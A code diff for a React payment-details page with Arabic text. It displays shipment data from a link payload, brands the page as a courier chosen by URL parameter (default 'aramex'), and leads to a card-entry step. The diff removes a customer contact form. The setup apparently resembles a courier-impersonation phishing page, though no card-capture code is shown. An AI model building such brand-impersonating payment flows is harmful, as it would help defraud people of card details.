@@ -1,39 +1,22 @@
-import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, Shield, ArrowLeft, Info, User, Mail, Phone, Package, Hash, MapPin, DollarSign } from "lucide-react";
+import { CreditCard, Shield, ArrowLeft, Hash, MapPin, DollarSign, User } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
-  const [customerName, setCustomerName] = useState("");
-  const [customerEmail, setCustomerEmail] = useState("");
-  const [customerPhone, setCustomerPhone] = useState("");
   
-  // Get service from link data or URL
   const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const branding = getServiceBranding(serviceName);
-  
-  // Extract shipping info from link payload
   const shippingInfo = linkData?.payload as any;
   
-  const handleProceed = (e: React.FormEvent) => {
-    e.preventDefault();
-    // Store customer info in sessionStorage
-    sessionStorage.setItem('customerInfo', JSON.stringify({
-      name: customerName,
-      email: customerEmail,
-      phone: customerPhone,
-      service: serviceName
-    }));
+  const handleProceed = () => {
     navigate(`/pay/${id}/card`);
   };
   
@@ -81,112 +64,61 @@ const PaymentDetails = () => {
           </div>
           
           <Card className="p-4 sm:p-8 shadow-elevated">
-            <form onSubmit={handleProceed}>
-              {/* Header */}
-              <div className="flex items-start justify-between mb-4 sm:mb-8">
-                <div>
-                  <h1 className="text-lg sm:text-2xl font-bold mb-1 sm:mb-2">تفاصيل الدفع</h1>
-                  <p className="text-xs sm:text-base text-muted-foreground">
-                    خدمة: {serviceName}
-                  </p>
-                </div>
-                
-                <div
-                  className="w-12 h-12 sm:w-16 sm:h-16 rounded-lg sm:rounded-xl flex items-center justify-center"
-                  style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                  }}
-                >
-                  <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
-                </div>
+            {/* Header */}
+            <div className="flex items-start justify-between mb-4 sm:mb-8">
+              <div>
+                <h1 className="text-lg sm:text-2xl font-bold mb-1 sm:mb-2">تفاصيل الدفع</h1>
+                <p className="text-xs sm:text-base text-muted-foreground">
+                  خدمة: {serviceName}
+                </p>
               </div>
               
-              {/* Shipping Info Display */}
-              {shippingInfo && (
-                <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-                  <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
-                  <div className="space-y-2 text-xs sm:text-sm">
-                    {shippingInfo.tracking_number && (
-                      <div className="flex items-center gap-2">
-                        <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                        <span className="text-muted-foreground">رقم الشحنة:</span>
-                        <span className="font-semibold">{shippingInfo.tracking_number}</span>
-                      </div>
-                    )}
-                    {shippingInfo.sender_name && (
-                      <div className="flex items-center gap-2">
-                        <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                        <span className="text-muted-foreground">المرسل:</span>
-                        <span className="font-semibold">{shippingInfo.sender_name}</span>
-                      </div>
-                    )}
-                    {shippingInfo.sender_city && (
-                      <div className="flex items-center gap-2">
-                        <MapPin className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                        <span className="text-muted-foreground">المدينة:</span>
-                        <span className="font-semibold">{shippingInfo.sender_city}</span>
-                      </div>
-                    )}
-                    {shippingInfo.cod_amount > 0 && (
-                      <div className="flex items-center gap-2">
-                        <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                        <span className="text-muted-foreground">مبلغ COD:</span>
-                        <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
-                      </div>
-                    )}
-                  </div>
-                </div>
-              )}
-
-              {/* Customer Info */}
-              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-                <div>
-                  <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                    <User className="w-3 h-3 sm:w-4 sm:h-4" />
-                    الاسم الكامل
-                  </Label>
-                  <Input
-                    id="name"
-                    value={customerName}
-                    onChange={(e) => setCustomerName(e.target.value)}
-                    required
-                    className="h-10 sm:h-12 text-sm sm:text-base"
-                    placeholder="أدخل اسمك الكامل"
-                  />
-                </div>
-                
-                <div>
-                  <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                    <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
-                    البريد الإلكتروني
-                  </Label>
-                  <Input
-                    id="email"
-                    type="email"
-                    value={customerEmail}
-                    onChange={(e) => setCustomerEmail(e.target.value)}
-                    required
-                    className="h-10 sm:h-12 text-sm sm:text-base"
-                    placeholder="example@email.com"
-                  />
-                </div>
-                
-                <div>
-                  <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                    <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
-                    رقم الهاتف
-                  </Label>
-                  <Input
-                    id="phone"
-                    type="tel"
-                    value={customerPhone}
-                    onChange={(e) => setCustomerPhone(e.target.value)}
-                    required
-                    className="h-10 sm:h-12 text-sm sm:text-base"
-                    placeholder="+966 5X XXX XXXX"
-                  />
+              <div
+                className="w-12 h-12 sm:w-16 sm:h-16 rounded-lg sm:rounded-xl flex items-center justify-center"
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                }}
+              >
+                <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
+              </div>
+            </div>
+              
+            {/* Shipping Info Display */}
+            {shippingInfo && (
+              <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
+                <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
+                <div className="space-y-2 text-xs sm:text-sm">
+                  {shippingInfo.tracking_number && (
+                    <div className="flex items-center gap-2">
+                      <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">رقم الشحنة:</span>
+                      <span className="font-semibold">{shippingInfo.tracking_number}</span>
+                    </div>
+                  )}
+                  {shippingInfo.sender_name && (
+                    <div className="flex items-center gap-2">
+                      <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">المرسل:</span>
+                      <span className="font-semibold">{shippingInfo.sender_name}</span>
+                    </div>
+                  )}
+                  {shippingInfo.sender_city && (
+                    <div className="flex items-center gap-2">
+                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">المدينة:</span>
+                      <span className="font-semibold">{shippingInfo.sender_city}</span>
+                    </div>
+                  )}
+                  {shippingInfo.cod_amount > 0 && (
+                    <div className="flex items-center gap-2">
+                      <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">مبلغ COD:</span>
+                      <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
+                    </div>
+                  )}
                 </div>
               </div>
+            )}
             
               {/* Payment Summary */}
               <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
@@ -230,23 +162,22 @@ const PaymentDetails = () => {
                 </div>
               </div>
               
-              {/* Proceed Button */}
-              <Button
-                type="submit"
-                size="lg"
-                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-                style={{
-                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                }}
-              >
-                <span className="ml-2">الدفع بالبطاقة</span>
-                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-              </Button>
-            
-              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-                بالمتابعة، أنت توافق على الشروط والأحكام
-              </p>
-            </form>
+            {/* Proceed Button */}
+            <Button
+              onClick={handleProceed}
+              size="lg"
+              className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+              style={{
+                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+              }}
+            >
+              <span className="ml-2">الدفع بالبطاقة</span>
+              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+            </Button>
+          
+            <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+              بالمتابعة، أنت توافق على الشروط والأحكام
+            </p>
           </Card>
         </div>
       </div>
